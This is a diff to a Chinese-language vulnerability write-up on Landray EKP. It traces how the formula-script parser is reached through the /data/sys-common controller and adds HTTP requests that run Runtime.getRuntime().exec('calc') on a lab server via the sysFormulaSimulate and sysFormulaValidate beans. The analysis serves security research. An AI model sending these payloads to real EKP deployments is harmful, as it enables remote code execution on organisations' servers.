@@ -265,7 +265,15 @@ com.landray.kmss.sys.rule.parser.RuleEngineParser#parseValueScript
 com.landray.kmss.tic.core.cacheindb.util.ToolUtil#transDataByImpl
 com.landray.kmss.tic.sap.sync.service.spring.TicSapSyncUniteQuartzService#findDeleteField
 ```
-上述很多类的执行方法为`parseValueScript()`，查找该方法在web目录下的调用类，包括`SysFormulaValidate、SysFormulaValidateByJS、SysFormulaValidateByScriptEngine、SysFormulaSimulateByJS`等（这些类都实现了IXMLDataBean接口），并且这些类对`parseValueScript()`的调用方法都是`getDataList(RequestContext requestInfo)`。查找调用`getDataList()`方法的类，发现存在一个Controller——`com.landray.kmss.common.actions.DataController`，这个Controller标注的路由为`/data/sys-common`。并且在`datajson()、dataxml()、treexml()`等方法中都调用了`getDataList()`
+上述很多类的执行方法为`parseValueScript()`，查找该方法在web目录下的调用类，包括
+* `SysFormulaValidate`
+* `SysFormulaValidateByJS`
+* `SysFormulaValidateByScriptEngine`
+* `SysFormulaSimulateByJS`
+* `SysFormulaSimulate`
+* `RuleFormulaValidate`
+
+（这些类都实现了IXMLDataBean接口），并且这些类对`parseValueScript()`的调用方法都是`getDataList(RequestContext requestInfo)`。查找调用`getDataList()`方法的类，发现存在一个Controller——`com.landray.kmss.common.actions.DataController`，这个Controller标注的路由为`/data/sys-common`。并且在`datajson()、dataxml()、treexml()`等方法中都调用了`getDataList()`
 ```java
 @RequestMapping(value = {"datajson"}, produces = {"application/json;charset=UTF-8"})
   @ResponseBody
@@ -322,6 +330,21 @@ Content-Type: application/x-www-form-urlencoded
 
 var={"body":{"file":"/sys/common/dataxml.jsp"}}&s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc")&type=int&modelName=test
 ```
+
+需要注意是对于SysFormulaSimulate，需要加一个model参数
+```
+GET /ekp/data/sys-common/dataxml.gif?s_bean=sysFormulaSimulate&script=Runtime.getRuntime().exec("calc")&model=com.landray.kmss.km.smissive.model.KmSmissiveNumber HTTP/1.1
+Host: 10.211.55.3:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36
+Accept: */*
+Referer: http://10.211.55.3:8080/ekp/sys/portal/page.jsp
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+If-Modified-Since: Sat, 10 Oct 2020 07:35:12 GMT
+Connection: close
+```
+
+`model`所指的类，需要实现`IExtendDataModel`或者`IBaseCreateInfoModel`接口。
 
 与之类似的还有erp_data.jsp，但它的接受bean的参数为`String service=request.getParameter("erpServcieName");`，发送请求时只需要将上述的s_bean换为erpServcieName
 ```
